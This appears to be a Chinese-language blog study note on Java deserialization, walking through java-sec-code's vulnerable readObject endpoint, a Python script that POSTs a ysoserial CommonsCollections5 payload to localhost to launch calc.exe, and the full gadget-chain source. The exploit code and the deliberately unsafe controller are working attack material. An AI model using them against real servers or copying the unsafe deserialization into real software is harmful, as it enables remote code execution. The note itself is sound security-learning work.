---
layout: post
title: java-sec-code反序列化示例学习\Ysoserial payload 生成
categories: java
tag: 从零开始学java
---


# 待解决
Ysoserial 调试过程中会执行一次payload 如弹计算器 ，但是正常执行并没有执行payload ? 原因不明

`final Object object = payload.getObject(command);`
下断点 F8 运行后弹
![](/styles/images/2019-5/debugcalc.png)

# java-sec-code 中java 反序列化示例
- 示例代码

    - 通过getInputStream 读取请求包体
    - 通过readObject  将字符串数据反序列化成对象

```java
package org.joychou.controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.ObjectInputStream;

/**
 * @author: JoyChou
 * @Date:   2018年06月14日
 * @Desc：  该应用必须有Commons-Collections包才能利用反序列化命令执行。
 */

@Controller
@RequestMapping("/deserialize")
public class Deserialize {

    @RequestMapping("/test")
    @ResponseBody
    public static String deserialize_test(HttpServletRequest request) throws Exception{
        try {
            InputStream iii = request.getInputStream();
            ObjectInputStream in = new ObjectInputStream(iii);
            in.readObject();  // 触发漏洞
            in.close();
            return "test";
        }catch (Exception e){
            return "exception";
        }
    }
}

```

pom.xml 已添加如下版本的commons-collections 库
```
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
```

- 项目示例exp
```python
#coding: utf-8
#author: JoyChou
#date:   2018.07.17

import requests
import subprocess

def poc(url , gadget, command):
	ys_filepath = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'
	popen = subprocess.Popen(['java', '-jar', ys_filepath, gadget, command], stdout=subprocess.PIPE)
	payload = popen.stdout.read()
	r = requests.post(url, data=payload, timeout=5)

if __name__ == '__main__':
	poc('http://127.0.0.1:8080/deserialize/test', 'CommonsCollections5', 'calc.exe')
```


win10 `java version "1.8.0_201" `环境实际测试 ysoserial 中 依赖 `commons-collections:3.1`的`CommonsCollections5` 和 `CommonsCollections6 `可成功执行
```
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
```


# Ysoserial CommonsCollections5 payload 代码
```java
package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
//@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}

```


- 在Java反序列化中，会调用被反序列化的readObject方法，AnnotationInvocationHandler
-  请注意，一个类的对象要想序列化成功，必须满足两个条件：该类必须实现 java.io.Serializable 对象。该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的

    + 序列化之后保存的是对象的信息
	+ 被声明为transient的属性不会被序列化，这就是transient关键字的作用
    + 被声明为static的属性不会被序列化，这个问题可以这么理解，序列化保存的是对象的状态，但是static修饰的变量是属于类的而不是属于对象的，因此序列化的时候不会序列化它


## Ysoserial CommonsCollections5 Gadget chain:
```
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
```

## java-sec-code 中java 反序列化示例执行到exec时的stack

![](/styles/images/2019-5/stack.png)

### BadAttributeValueExpException
---

```java
public class BadAttributeValueExpException extends Exception   {


    /* Serial version */
    private static final long serialVersionUID = -3105272988410493376L;

    /**
     * @serial A string representation of the attribute that originated this exception.
     * for example, the string value can be the return of {@code attribute.toString()}
     */
    private Object val;

    /**
     * Constructs a BadAttributeValueExpException using the specified Object to
     * create the toString() value.
     *
     * @param val the inappropriate value.
     */
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }


    /**
     * Returns the string representing the object.
     */
    public String toString()  {
        return "BadAttributeValueException: " + val;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
 }

```

Ysoserial CommonsCollections5 应该序列化了 BadAttributeValueExpException 对象
设置val 的值为 lazyMap

### lazyMap

```java
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);
```

### ChainedTransformer

```java

   public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

### InvokerTransformer.transform()

![](/styles/images/2019-5/javainvokerTransformer.png)

完成执行exec
![](/styles/images/2019-5/javaexec.png)